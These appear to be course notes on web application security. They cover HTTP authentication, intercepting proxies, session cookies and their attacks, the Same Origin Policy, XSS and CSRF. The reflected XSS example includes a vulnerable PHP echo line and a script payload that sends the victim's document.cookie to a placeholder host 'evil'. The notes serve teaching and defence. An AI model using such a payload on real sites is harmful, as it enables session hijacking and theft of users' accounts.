---
Class: "[[Cybersecurity]]"
Related:
---
---
## Introduction
### HTTP authentication
Authentication mechanism was introduced by RFC 2616 (rarely used nowadays), operates as it follows:
1. the browser starts a request without sending any client-side credential
2. the server replies with a status message `401 Unauthorized` (with a specific WWW-Authenticate header, which contains information on the authentication method)
3. the browsed het the client’s credentials and include them in the Authorization header

Today there are two main mechanisms to send the credential to the server:
- basic → the password is base64-encoded and sent to the server
- digest → the credentials are hashed and sent to the server (along with a nonce)

### Monitoring and manipulating HTTP
Payload is encapsulated in TCP packets (default: port 80) in cleartext communication easy to monitoring (through sniffing tools, e.g. ngrep, wireshark, …) and manipulate (browser extensions, proxy, netcat, curl, …)

>[!question] What about HTTPS?
>- browser extensions
>- proxy

### Proxy
The proxies are HTTP/HTTPS traffic shaping/mangling application-independent intermediate servers. Those servers make the requests on behalf of the client

In HTTPS the browser will notify an error in the SSL certificate verification

>[!example] HTTP proxies
>- [WebScarab](https://www.owasp.org/index.php/Webscarab)
>- [ProxPy](https://code.google.com/p/proxpy/)
>- [Burp](https://www.portswigger.net/burp)

#### Burp Suite
Burp suite is an integrated platform to perform security testing of web applications. Usually begins with an initial mapping and analysis of an application’s attack surface, to discover and exploit security vulnerabilities (payed version)

Burp also allows to combine advanced manual techniques with parts of automation. Main components are:
- interception proxy
- application-aware spider
- web application scanner
- intruder tool
- repeater tool
- sequencer tool

---
## HTTP session

>[!question] Problem
>HTTP is stateless: every request is independent from the previous ones but dynamic web application require the ability to maintain some kind of sessions
>>[!done] Sessions!
>>- avoid login-ins for every requested page
>>- store user preferences
>>- keep track of past actions of the user (e.g. shopping cart)
>>- …

Sessions are implemented by web application themselves and their informations are transmitted between the client and the server

>[!question] How to transmit the session information?
>1. payload HTTP
>```html
><input type="hidden" name="sesisonid" value="7456">
>```
>2. url
>```
>http://www.example.com/page.php?sessionid=7456
>```
>3. header HTTP (e.g. cookie)
>```http
>GET /page.php HTTP/1.1
>Host: www.example.com
>...
>Cookie: sessionid=7456
>...
>```

### Cookies
Cookies are data created by the server, memorized by the client and transmitted between client and server using HTTP header

>[!quote] Cookie definition RFC 2109
>| Attribute     | Description                                                                      |
>| ------------- | -------------------------------------------------------------------------------- |
>| `name=values` | generic data (mandatory)                                                         |
>| `Expires`     | expire date                                                                      |
>| `Path`        | path for which the cookie is valid                                               |
>| `Domain`      | domain on which the cookie is valid                                              |
>| `Secure`      | flag that states whether the cookie must be transmitted on a secure channel only |
>| `HttpOnly`    | no API allowed to access `document.cookie`                                       |

There are two possible mechanism to create a session schema:
- data inserted manually by the coder of the web application (obsolete and unsecure)
- implemented in the programming language of the application

**Session cookies** are one of the most used technique to keep a session. In this case the session data is stored on the server, and the server sends a session id to the client through a cookie, so for each session the client has to send back the id to the server then the server uses this id to retrieve information

>[!bug] Security of cookie sessions
>Cookie sessions are one of the most critical elements in web application (they are also used for authentication). For this reason they should be considered valid for a small amount of time.
>
>Let’s see the possible attacks:
>- hijacking → use SSL/TLS
>- prediction → use a good RRNG
>- brute force → increase id length
>- session fixation → check IP, referer
>- stealing (XSS)

#### Session hijacking
![[Pasted image 20251127154548.png]]

>[!hint] Session hijacking for dummies
> ![[Pasted image 20251127154653.png|400]]
> [https://codebutler.com/firesheep/](https://codebutler.com/firesheep/)

#### Session prediction
Early php implementation of session were susceptible to this attack. It consists of predicting the session ID to be able to bypass the authentication schema and can be done by analyzing the session ID generation process

#### Session fixation
![[Pasted image 20251127155321.png]]

>[!warning]
>The session fixation attack is not a class of Session Hijacking, which steals the established session between the client and the Web Server after the user logs in. Instead, the Session Fixation attack fixes an established session on the victim’s browser, so the attack starts before the user logs in.

---
## Insecure direct object reference
It can happen when an application provides direct access to objects on user-supplied input so the user can directly access informations not intended to be accessible

The goal is to bypass authorization check leveraging session cookies to access resources in the system directly, for example database records or files.

>[!example]
>In a POST response some private user’s information (e.g. phone number) are attached

---
## Content isolation
Most of the browser’s security mechanisms rely on the possibility of isolating documents (and execution contexts) depending on the resource’s origin. So that the pages from different sources should not be allowed to interfere with each other

>[!example]
>Content coming from website $A$ can only read and modify content coming from $A$, but cannot access content coming from website $B$

This means that a malicious website cannot run scripts that access data and functionalities of other websites visited by the user

>[!example] Cross site example
>You are logged into Facebook and visit a malicious website in another browser tab. What prevents that website to perform any actions with Facebook as you? The **Same Origin Policy** (if the Js is included from a HTML page on facebook.com, it may access facebook.com resources)

### Same Origin Policy
SOP was introduced by Netscape in 1995, 1 year after the standardization of cookies.

>[!quote] SOP prerequisites
>Any 2 scripts executed in 2 given execution contexts can access their DOMs iff the protocol, domain name and porte of their host documents are the same
>
>>[!example]
>>| Originating document    | Accessed document        | non-IE browser    | Internet Explorer |
>>| ----------------------- | ------------------------ | ----------------- | ----------------- |
>>| `http://example.com/a`  | `http://example.com/b`   | access ok         | access ok         |
>>| `http://example.com`    | `http://www.example.com` | host mismatch     | host mismatch     |
>>| `http://example.com`    | `https://example.com`    | protocol mismatch | protocol mismatch |
>>| `http://example.com:81` | `http://example.com`     | port mismatch     | access ok         |

#### Implications
The identification of all the points where to enforce security checks is not straightforward:
- a website cannot read or modiry cookies or other DOM elements of other websites
- actions such as “modify a page/app content of another window” should always require a security check
- a website can request a resource from another website, but cannot process the received data
- actions such as “follow a link” should always be allowed

#### Limits and solutions
SOP simplicity is its limit too, in fact we cannot isolate homepages of different users hosted on the same protocol/domain/port and different domains cannot easily interact among each others (e.g. access each other DOMs, `http://store.google.com` and `play.google.com`)

>[!done] Solutions
>1. `document.domain` → both scripts can set their top level domain as their domain control (e.g. `http://google.com`); but now communication among other (sub)domain is possible
>2. `postMessage(...)` → more secure version, introduced by HTML5

---
## Client-side vs. server-side attacks
Exploit of the trust:
- of the browser → cross site scripting, cross site request forgery
- of the server → command injection, file inclusion, thread concurrency, SQL injection

In particular, for what is concerting the client-side attacks, they explit the trust that a user has of a website (XSS) or that a website has toward a user (CSRF). The steps are:
1. the attacker can inject either HTML or Javascript
2. the victim visits the vulnerable webpage
3. the browser interprets the attacker-injected code

The aims of this kind of attacks are:
- stealing of cookies associated to the vulnerable domain
- login form manipulations
- execute of additional GET/POST

---
## Corss-Site Scripting (XSS)
The target is the users’ applications (not the server) and the goal is to gain unauthorized access to information stored on the client (browser) or unauthorized actions through the lack of input sanitization

>[!info] In a nutshell
>- the original web page is modified and HTML/Js code is injected into the page
>- the client’s browser executes any code and renders any HTML present on the (vulnerable) page

There are three types of XSS attack:
- **reflected XSS** → the injection happens in a parameter used by the page to dynamically display information to the user
- **stored XSS** → the injection is stored in a page of the web application (typically the DB) and then displayed to users accessing such a page
- **DOM-based XSS** → the injection happens in a parameter used by a script running within the page itself

>[!warning] Possible effects
>- capture information of the victim (session) → the attacker can “impersonate” the victim
>- display additional/misleading information → convince that something is happening
>- inject additional form fields → can also exploit the autofill feature
>- make victim to do something instead of you → SQL injection using another account
>- many more…

### Reflected Cross-Site Scripting

>[!info] In a nutshell
>- a webpage is vulnerable to XSS
>- a victim is lured to visit the vulnerable web page
>- the exploit (carried in the URL) is reflected off the victim

>[!bug] Obfuscation
>- encoding techniques
>- hiding techniques (e.g. exploit link hidden in the status bar)
>- harmless link that redirects to a malicious web site (e.g. HTTP 3xx)

DOM-based XSS are very similar

>[!example]
>![[Pasted image 20251127220250.png]]
>
>`xss_test.php` (PHP server-side page)
>```php
>Welcome <?php echo $_GET['inject']; ?>
>```
>
>Link sent to the victim
>```
>http://www.example.com/xss_test.php?inject=<script>document.location='http://evil/log.php?'+document.cookie</script>
>```
>
>Corresponding HTTP requests (issued by the victim’s browser)
>```http
>GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F evil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E
>Host: www.example.com
>...
>```
>
>The HTML generated by the server
>```html
>Welcome <script>document.location=’http://evil/log.php?’+document.cookie</script>
>```

### Stored Cross-Site Scripting
Step 1
- the attacker sends (e.g. uploads) to the server the code to inject
- the server stores the injected code persistently (e.g. in a database)
Step 2
- the client visits the vulnerable web page
- the server return the resource along with the injected code

>[!info] Insights
>- all the users that will visit the vulnerable resource will be victim of the attack
>- the injected code is not visible as a URL
>- more dangerous than reflected XSS

>[!example] Attack in action
>![[Pasted image 20251127221618.png]]

---
## Request forgery
Request forgery (also known as one-click attack, session riding, hostile linking) aims to have a victim to execute a number of actions, using her credential (e.g. session cookie) without stealing data and without the direct access to the cookies (with JS we can’t access cookie of other domain).

It can be On Site or Cross Site (CSRF) and can be both reflected and stored

### CSRF principles
Here browser requests automatically to include any credential associated with the site (user’s session cookie, IP address, credentials, …). So the attacker makes an authenticated user to submit a malicious, unintentional request (this can happen from a different source, hostile website)

If the user is currently authenticated, the site will have no way to distinguish between a legitimate and a forged request sent by the victim

>[!example]
>![[Pasted image 20251127222442.png]]